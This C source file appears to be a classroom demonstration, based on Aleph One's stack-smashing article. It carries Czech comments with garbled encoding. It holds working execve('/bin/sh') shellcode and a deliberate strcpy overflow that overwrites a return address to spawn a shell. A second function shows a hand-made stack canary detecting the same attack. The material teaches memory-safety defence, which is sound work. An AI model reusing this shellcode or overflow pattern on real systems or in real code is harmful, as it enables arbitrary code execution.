
/*
 * example of buffer overflow security problem
 *
 * based on article
 *  "Smashing The Stack For Fun And Profit" by Aleph One
 *  in Phrack 49
 *
 */


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

char shellcode[] = "\x90"	/* NOP */
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char large_string[128];

void f1(void)
{
    char buffer[96];
    int i;
    long *long_ptr = (long *) large_string;

    /***************************************************************/
    for (i = 0; i < 32; i++)
	*(long_ptr + i) = (int) buffer + 1;	/* nesm� obsahovat nulov� bajt! */

    for (i = 0; i < strlen(shellcode); i++)
	large_string[i] = shellcode[i];

    strcpy(buffer, large_string);	/* zde dojde k p�eps�n� n�vratov� adresy */
    /***************************************************************/
}

void f2(void)
{
    volatile int canary;	/* mus� b�t nad polem buffer */
    char buffer[96];
    int i;
    long *long_ptr = (long *) large_string;
    int random_ = rand();	/* n�hodn� ��slo, aby se s t�m nedalo nic d�lat */
    canary = random_;		/* n�hodn� hodnota - "kan�rek" */

    /***************************************************************/
    for (i = 0; i < 32; i++)
	*(long_ptr + i) = (int) buffer + 1;	/* nesm� obsahovat nulov� bajt! */

    for (i = 0; i < strlen(shellcode); i++)
	large_string[i] = shellcode[i];

    strcpy(buffer, large_string);	/* zde dojde k p�eps�n� n�vratov� adresy */
    /***************************************************************/

    if (canary != random_) {	/* kontrola "kan�rka" */
	fprintf(stderr, "***** pokus o crack odhalen!\n");
	exit(1);		/* nesm�me pokra�ovat */
    }
    fprintf(stderr, "***** neodhaleny pokus o crack!\n");
}

int main(int argc, char *argv[])
{
    srand(time(NULL));
    printf("Crack test (pro argc>1 testuje ochranu z�sobn�ku)\n");
    if (argc == 1) {
	fprintf(stderr, "Pou�ijte exit pro ukon�en�...\n");
	f1(); /* zde z�sk�me mo�nost zad�vat p��kazy ... */
    } else
	f2(); /* zde je crack odhalen a aplikace ukon�ena je�t� p�ed jeho spu�t�n�m */
    return 0;
}
